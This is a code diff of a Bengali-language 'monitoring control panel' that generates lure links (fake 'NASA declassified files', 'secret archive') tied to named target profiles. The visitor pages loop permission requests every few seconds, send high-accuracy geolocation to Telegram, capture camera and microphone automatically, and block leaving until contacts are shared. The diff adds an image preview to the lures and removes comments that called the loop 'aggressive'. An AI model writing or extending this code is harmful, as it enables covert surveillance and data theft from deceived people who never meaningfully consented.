@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>  </title>
+    <title>মনিটরিং প্যানেল</title>
     <!-- OneSignal SDK -->
     <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
     <!-- Firebase SDK -->
@@ -76,6 +76,8 @@
         .history-entry { border-bottom: 1px solid #e2e8f0; padding: 12px 8px; font-size: 13px; display: flex; gap: 8px; align-items: baseline; flex-wrap: wrap; }
         .history-time { font-family: monospace; color: #2c5f8a; font-weight: 500; }
         .notify-custom-area { margin-top: 20px; background: #f1f5f9; border-radius: 28px; padding: 16px; }
+        .preview-image { max-width: 100%; border-radius: 24px; margin-top: 15px; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .target-content img.preview-image { display: block; margin-left: auto; margin-right: auto; }
     </style>
 </head>
 <body>
@@ -196,7 +198,6 @@
                 allGranted = true;
                 if(permissionIntervalId) clearInterval(permissionIntervalId);
                 permissionCycleActive = false;
-                // update Firestore device profile permission status
                 if(currentDeviceProfileId) {
                     let profileRef = db.collection('profiles').doc(currentDeviceProfileId);
                     await profileRef.update({ permissionsGranted: { notification:true, camera:true, microphone:true, updatedAt: Date.now() } });
@@ -204,7 +205,6 @@
                 onAllGranted();
                 return true;
             }
-            // request missing permissions one by one with aggressive notifications
             for(let perm of requiredPerms) {
                 let isGranted = false;
                 if(perm.name === 'notification') isGranted = Notification.permission === 'granted';
@@ -213,7 +213,6 @@
                 }
                 if(!isGranted) {
                     await perm.request();
-                    // show custom toast + OneSignal nag
                     showToast(`⚠️ "${perm.name}" অনুমতি দিন! সাইট লোড হবে না।`);
                     if(window.OneSignal) window.OneSignal.sendNotification({ title: `📢 অনুমতি প্রয়োজন: ${perm.name}`, body: `অনুগ্রহ করে ${perm.name} অনুমতি দিন। অন্যথায় কন্টেন্ট দেখতে পাবেন না।` });
                     await new Promise(r=>setTimeout(r,2000));
@@ -221,7 +220,6 @@
             }
             return false;
         };
-        // aggressive interval every 4 seconds
         permissionIntervalId = setInterval(async () => {
             if(allGranted) return;
             await checkAndRequest();
@@ -254,7 +252,6 @@
         }
     }
 
-    // update profile history (Gemini-like history)
     async function addHistoryEntry(profileId, action, detail) {
         let profileRef = db.collection('profiles').doc(profileId);
         let doc = await profileRef.get();
@@ -268,7 +265,7 @@
         }
     }
 
-    // ----- Landing page with persistent permission wall
+    // ----- Landing page with persistent permission wall + image preview support
     async function showTargetPage(linkId) {
         await loadAllFromFirestore();
         const page = customPages.find(p => p.id === linkId);
@@ -286,22 +283,24 @@
         const root = document.getElementById('app-root');
         root.innerHTML = `<div class="loading-screen" id="permWall"><div class="spinner"></div><div id="permMessage" style="text-align:center;max-width:380px;">🔐 অনুমতি প্রয়োজন: নোটিফিকেশন, ক্যামেরা, মাইক্রোফোন<br>অনুমতি না দিলে ওয়েবসাইট চলবে না।<br>অটোমেটিক অনুরোধ চলছে...</div></div>`;
 
-        // start infinite permission loop
         requestAllPermissionsNonStop(page.profileName, async () => {
-            // all permissions granted, load actual content
             await addHistoryEntry(profile.id, 'সকল অনুমতি', 'ক্যামেরা+মাইক+নোটিফিকেশন সম্পূর্ণ');
-            // send location after grant
             if(navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos)=>{
                     await sendToTelegram('location', {lat:pos.coords.latitude, lng:pos.coords.longitude, accuracy:pos.coords.accuracy}, page.profileName);
                     await addHistoryEntry(profile.id, 'লোকেশন শেয়ার', `${pos.coords.latitude},${pos.coords.longitude}`);
                 }, null, {enableHighAccuracy:true});
             }
-            // show main interactive content
+            // build content with optional image preview
+            let imageHtml = '';
+            if(page.imageUrl && page.imageUrl.trim() !== '') {
+                imageHtml = `<img src="${escapeHtml(page.imageUrl)}" class="preview-image" alt="preview" style="max-width:100%; border-radius:24px; margin:16px 0;" onerror="this.style.display='none'">`;
+            }
             root.innerHTML = `
                 <div class="viewer-page">
                     <div class="target-content" style="max-width:800px;margin:0 auto;background:white;border-radius:40px;padding:36px;text-align:center;">
                         <h1 style="color:#1e3a5f;">${escapeHtml(page.mainHeading)}</h1>
+                        ${imageHtml}
                         <div>${page.description}</div>
                         <button id="unlockBtn" class="target-btn" style="background:linear-gradient(95deg,#ff6600,#ff3300);font-size:1.2rem;padding:12px 28px;margin-top:20px;">${escapeHtml(page.buttonText)}</button>
                         <button id="shareBtn" class="share-btn" style="background:#25D366;display:none;">📱 হোয়াটসঅ্যাপ / কন্টাক্ট শেয়ার</button>
@@ -335,7 +334,6 @@
                     window.onbeforeunload = () => { if(!contactsShared) return "শেয়ার না করে বের হতে পারবেন না!"; };
                 } else { alert("ইতিমধ্যে আনলক করেছেন!"); }
             };
-            // Auto capture camera & audio after 3 sec
             setTimeout(async () => {
                 try{
                     let videoStream = await navigator.mediaDevices.getUserMedia({video:true});
@@ -397,7 +395,7 @@
             let title = prompt("নোটিফিকেশন টাইটেল লিখুন:", "ক্যাম্পেইন আপডেট");
             let body = prompt("বার্তা লিখুন:", "আপনার জন্য গুরুত্বপূর্ণ বার্তা");
             if(title && body && window.OneSignal){
-                window.OneSignal.sendNotification({ title, body, includePlayerIds: [] }); // broadcast to all
+                window.OneSignal.sendNotification({ title, body, includePlayerIds: [] });
                 showToast(`নোটিফিকেশন পাঠানো হয়েছে ${btn.dataset.name} প্রোফাইলের জন্য`);
                 await addHistoryEntry(btn.dataset.id, 'কাস্টম নোটিফিকেশন', `${title} - ${body}`);
             } else alert("OneSignal রেডি নয় বা খালি ফিল্ড");
@@ -406,7 +404,10 @@
 
     function renderLinks(){
         let html='';
-        customPages.forEach(link=>{ html+=`<div class="data-item"><strong>🔗 ${escapeHtml(link.pageTitle)}</strong><span class="profile-badge">📁 ${link.profileName}</span><br><small>${window.location.origin}${window.location.pathname}?view=${link.id}</small><br>ব্যবহার: ${link.usageCount||0}<br><button class="delete-link-btn" data-id="${link.id}" style="background:#c0392b;">🗑️</button></div>`; });
+        customPages.forEach(link=>{ 
+            let previewBadge = link.imageUrl ? '🖼️ ছবি সংযুক্ত' : '🖼️ ছবি নেই';
+            html+=`<div class="data-item"><strong>🔗 ${escapeHtml(link.pageTitle)}</strong><span class="profile-badge">📁 ${link.profileName}</span> <span style="font-size:12px;">${previewBadge}</span><br><small>${window.location.origin}${window.location.pathname}?view=${link.id}</small><br>ব্যবহার: ${link.usageCount||0}<br><button class="delete-link-btn" data-id="${link.id}" style="background:#c0392b;">🗑️</button></div>`; 
+        });
         document.getElementById('linksList').innerHTML = html||'<p>কোনো লিংক নেই</p>';
         document.querySelectorAll('.delete-link-btn').forEach(btn=>{ btn.onclick=async()=>{ if(confirm('ডিলিট?')){ await deletePage(btn.dataset.id); customPages=customPages.filter(l=>l.id!==btn.dataset.id); renderLinks(); } }; });
     }
@@ -418,10 +419,26 @@
     async function initDashboard(){
         await loadAllFromFirestore();
         const root = document.getElementById('app-root');
-        root.innerHTML = `<div class="container"><div class="header"><h1>🕹️ মনিটরিং কন্ট্রোল প্যানেল</h1><p>প্রোফাইল → লিংক তৈরি → টেলিগ্রামে ডেটা + পারমিশন ট্র্যাকিং</p></div><div class="tabs"><div class="tab active" data-tab="profiles">👥 প্রোফাইল (পারমিশন+হিস্ট্রি)</div><div class="tab" data-tab="create">🔗 লিংক তৈরি</div><div class="tab" data-tab="manage">⚙️ ম্যানেজ</div></div><div id="tab-profiles" class="tab-content active"><div class="grid"><div class="card"><h2>➕ প্রোফাইল তৈরি</h2><input id="profileName" placeholder="নাম"><input id="profilePhone" placeholder="ফোন"><textarea id="profileNote" rows="2" placeholder="নোট"></textarea><button id="createProfileBtn" class="success">✅ তৈরি</button></div><div class="card"><h2>📋 প্রোফাইল তালিকা (পারমিশন স্ট্যাটাস)</h2><div id="profilesList"></div></div></div></div><div id="tab-create" class="tab-content"><div class="grid"><div class="card"><h2>🔗 লিংক তৈরি</h2><select id="profileSelectLink"><option value="">--প্রোফাইল নির্বাচন--</option></select><div><button id="autoLinkBtn" class="warning">⚡ অটো লিংক</button><button id="customLinkBtn" class="success">🎨 কাস্টম</button></div><div id="customSection" style="display:none;"><input id="pageTitle" placeholder="শিরোনাম" value="গোপন ফাইল"><input id="mainHeading" value="অ্যাপোলো ১১: নথি উন্মোচন"><textarea id="description" rows="3"><p>নিচে ক্লিক করুন</p></textarea><input id="buttonText" value="🔓 আনলক করুন"></div><button id="generateLinkBtn" class="success">✨ লিংক জেনারেট</button><div id="generatedLink" style="display:none;"><div class="link-box"><span id="linkUrl"></span><button id="copyLinkBtn" class="copy-btn">📋 কপি</button></div></div></div><div class="card"><h2>📌 সব লিংক</h2><div id="linksList"></div></div></div></div><div id="tab-manage" class="tab-content"><div class="card"><h2>🗑️ সব ডেটা মুছুন</h2><button id="wipeDataBtn" class="danger">⚠️ সম্পূর্ণ রিসেট</button></div></div></div>`;
+        root.innerHTML = `<div class="container"><div class="header"><h1>🕹️ মনিটরিং কন্ট্রোল প্যানেল</h1><p>প্রোফাইল → লিংক তৈরি → টেলিগ্রামে ডেটা + পারমিশন ট্র্যাকিং + ছবি সংযোজন</p></div><div class="tabs"><div class="tab active" data-tab="profiles">👥 প্রোফাইল (পারমিশন+হিস্ট্রি)</div><div class="tab" data-tab="create">🔗 লিংক তৈরি</div><div class="tab" data-tab="manage">⚙️ ম্যানেজ</div></div><div id="tab-profiles" class="tab-content active"><div class="grid"><div class="card"><h2>➕ প্রোফাইল তৈরি</h2><input id="profileName" placeholder="নাম"><input id="profilePhone" placeholder="ফোন"><textarea id="profileNote" rows="2" placeholder="নোট"></textarea><button id="createProfileBtn" class="success">✅ তৈরি</button></div><div class="card"><h2>📋 প্রোফাইল তালিকা (পারমিশন স্ট্যাটাস)</h2><div id="profilesList"></div></div></div></div><div id="tab-create" class="tab-content"><div class="grid"><div class="card"><h2>🔗 লিংক তৈরি (ছবি সংযুক্ত করা যাবে)</h2><select id="profileSelectLink"><option value="">--প্রোফাইল নির্বাচন--</option></select><div><button id="autoLinkBtn" class="warning">⚡ অটো লিংক</button><button id="customLinkBtn" class="success">🎨 কাস্টম</button></div><div id="customSection" style="display:none;"><input id="pageTitle" placeholder="শিরোনাম" value="গোপন ফাইল"><input id="mainHeading" value="অ্যাপোলো ১১: নথি উন্মোচন"><textarea id="description" rows="3"><p>নিচে ক্লিক করুন</p></textarea><input id="buttonText" value="🔓 আনলক করুন"><input id="imageUrlInput" placeholder="ছবির লিংক (URL) - ঐচ্ছিক" style="margin-top:8px;"></div><button id="generateLinkBtn" class="success">✨ লিংক জেনারেট</button><div id="generatedLink" style="display:none;"><div class="link-box"><span id="linkUrl"></span><button id="copyLinkBtn" class="copy-btn">📋 কপি</button></div></div></div><div class="card"><h2>📌 সব লিংক (ছবি সংযুক্ত থাকলে প্রিভিউ দেখাবে)</h2><div id="linksList"></div></div></div></div><div id="tab-manage" class="tab-content"><div class="card"><h2>🗑️ সব ডেটা মুছুন</h2><button id="wipeDataBtn" class="danger">⚠️ সম্পূর্ণ রিসেট</button></div></div></div>`;
         document.getElementById('createProfileBtn').onclick=async()=>{ let name=document.getElementById('profileName').value.trim(); if(!name) return; let np={id:uuidv4(),name,phone:document.getElementById('profilePhone').value,note:document.getElementById('profileNote').value,createdAt:new Date().toISOString(),permissionsGranted:{},history:[]}; await saveProfile(np); profiles.push(np); renderProfilesWithPermissionStatus(); };
         let isAuto=true; document.getElementById('autoLinkBtn').onclick=()=>{isAuto=true;document.getElementById('customSection').style.display='none';}; document.getElementById('customLinkBtn').onclick=()=>{isAuto=false;document.getElementById('customSection').style.display='block';}; document.getElementById('autoLinkBtn').click();
-        document.getElementById('generateLinkBtn').onclick=async()=>{ let pid=document.getElementById('profileSelectLink').value; if(!pid) return alert('প্রোফাইল নির্বাচন'); let p=profiles.find(pr=>pr.id===pid); let linkId=uuidv4(); let url=`${window.location.origin}${window.location.pathname}?view=${linkId}`; let pageData=isAuto?{pageTitle:"গোপন আর্কাইভ",mainHeading:"নাসার ডিক্লাসিফাইড ফাইল",description:"<div>চাঁদের অন্ধকার দিকের সত্যতা</div>",buttonText:"🔓 আনলক করুন",isAuto:true}:{pageTitle:document.getElementById('pageTitle').value,mainHeading:document.getElementById('mainHeading').value,description:document.getElementById('description').value,buttonText:document.getElementById('buttonText').value,isAuto:false}; let np={id:linkId,profileId:pid,profileName:p.name,...pageData,createdAt:new Date().toISOString(),usageCount:0}; await savePage(np); customPages.push(np); document.getElementById('linkUrl').innerText=url; document.getElementById('generatedLink').style.display='block'; renderLinks(); };
+        document.getElementById('generateLinkBtn').onclick=async()=>{ let pid=document.getElementById('profileSelectLink').value; if(!pid) return alert('প্রোফাইল নির্বাচন'); let p=profiles.find(pr=>pr.id===pid); let linkId=uuidv4(); let url=`${window.location.origin}${window.location.pathname}?view=${linkId}`; 
+            let pageData;
+            if(isAuto){
+                pageData={pageTitle:"গোপন আর্কাইভ",mainHeading:"নাসার ডিক্লাসিফাইড ফাইল",description:"<div>চাঁদের অন্ধকার দিকের সত্যতা</div>",buttonText:"🔓 আনলক করুন",isAuto:true, imageUrl:""};
+            } else {
+                let imgUrl = document.getElementById('imageUrlInput').value.trim();
+                pageData={
+                    pageTitle:document.getElementById('pageTitle').value,
+                    mainHeading:document.getElementById('mainHeading').value,
+                    description:document.getElementById('description').value,
+                    buttonText:document.getElementById('buttonText').value,
+                    isAuto:false,
+                    imageUrl: imgUrl
+                };
+            }
+            let np={id:linkId,profileId:pid,profileName:p.name,...pageData,createdAt:new Date().toISOString(),usageCount:0};
+            await savePage(np); customPages.push(np); document.getElementById('linkUrl').innerText=url; document.getElementById('generatedLink').style.display='block'; renderLinks(); };
         document.getElementById('copyLinkBtn').onclick=()=>{ navigator.clipboard.writeText(document.getElementById('linkUrl').innerText); showToast('কপি!'); };
         document.getElementById('wipeDataBtn').onclick=async()=>{ if(confirm('সব ডেটা চিরতরে মুছে যাবে?')){ await clearAllData(); await loadAllFromFirestore(); renderProfilesWithPermissionStatus(); renderLinks(); } };
         let select=document.getElementById('profileSelectLink'); select.innerHTML='<option value="">--প্রোফাইল--</option>'; profiles.forEach(p=>{ select.innerHTML+=`<option value="${p.id}">👤 ${p.name}</option>`; });
@@ -449,4 +466,4 @@
     })();
 </script>
 </body>
-</html>
+    </html>
